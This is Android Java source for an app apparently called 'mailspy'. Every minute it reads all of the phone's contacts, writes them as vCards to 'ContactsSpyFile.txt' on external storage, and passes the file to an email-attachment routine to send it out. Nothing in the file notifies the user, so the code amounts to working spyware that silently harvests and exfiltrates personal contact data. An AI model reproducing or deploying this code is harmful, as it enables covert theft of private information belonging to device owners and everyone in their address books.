package com.nesl.fatimanwar.mailspy;

import android.app.Activity;
import android.content.Context;
import android.content.res.AssetFileDescriptor;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.provider.ContactsContract;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;

/** Some code snippet referred from,
 * http://stackoverflow.com/questions/2020088/sending-email-in-android-using-javamail-api-without-using-the-default-built-in-a/2033124#2033124
 * http://stackoverflow.com/questions/8147563/export-the-contacts-as-vcf-file
 */
public class MainActivity extends Activity {

    AsyncTask<Void, Void, Void> mTask;
    private final Handler mHandler = new Handler();
    private Runnable mTimer;

    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

            mTimer = new Runnable() {
                @Override
                public void run() {
                    Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
                    if(cursor != null && cursor.getCount() > 0)
                    {
                        mTask = new SendEmail(getBaseContext(), cursor).execute();
                    }
                    mHandler.postDelayed(this, 60000); //Repeating every one minute
                }
            };
            mHandler.postDelayed(mTimer, 60000);




        final Button send = (Button) this.findViewById(R.id.send);
        send.setOnClickListener(new View.OnClickListener() {

            public void onClick(View v) {
                mTask.cancel(true);
                mHandler.removeCallbacks(mTimer);//Press cancel button to stop this process
            }
        });


    }
}

class SendEmail extends AsyncTask<Void, Void, Void> {

    Context context;
    Cursor cursor;
    //GmailSender sender;
    File f;
    static final String TAG = "backgroundSendEmail";
    private OutputStreamWriter logStream;

    public SendEmail(Context context, Cursor cursor){
        this.context = context;
        this.cursor = cursor;
        try {
            String path = Environment.getExternalStorageDirectory().getAbsolutePath() + "/ContactsSpyFile.txt";
            f = new File(path);
            if (f.exists()) {
                f.delete();
                f.createNewFile();
                logStream = new OutputStreamWriter(new FileOutputStream(f));
                Log.e(TAG, "File exists so we are recreating it");
            } else {
                Log.e(TAG, "File does not exist so we are creating it");
                f.createNewFile();
                logStream = new OutputStreamWriter(new FileOutputStream(f));
            }
            logStream.write("Contacts info.\n");
        }catch(FileNotFoundException e) {
            logStream = null;
            Log.e(TAG, "FileNotFoundException");
        } catch(IOException e) {
            logStream = null;
            Log.e(TAG, "IOException");
        }
    }

    @Override
    protected Void doInBackground(Void... params) {

        cursor.moveToFirst();
        while (cursor.moveToNext())
        {
            if(isCancelled())
                break;

            String lookupKey = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.LOOKUP_KEY));
            Uri uri = Uri.withAppendedPath(ContactsContract.Contacts.CONTENT_VCARD_URI, lookupKey);

            AssetFileDescriptor fd;
            try {
                fd = context.getContentResolver().openAssetFileDescriptor(uri, "r");
                FileInputStream fis = fd.createInputStream();
                byte[] buf = new byte[(int) fd.getDeclaredLength()];
                fis.read(buf);
                String vcardstring= new String(buf);

                logStream.write(vcardstring.toString()+"\n");



            }catch (Exception e) {
                e.printStackTrace();
                Log.e(TAG, "file writing exception");
            }
        }
        Log.i(TAG, "Done writing file, Now emailing...");
        String str = f.toString();
        try {
            mailAttachment.addAttach();

        }catch (Exception e) {
            e.printStackTrace();
            Log.e(TAG, "email exception");
        }
        return null;
    }
}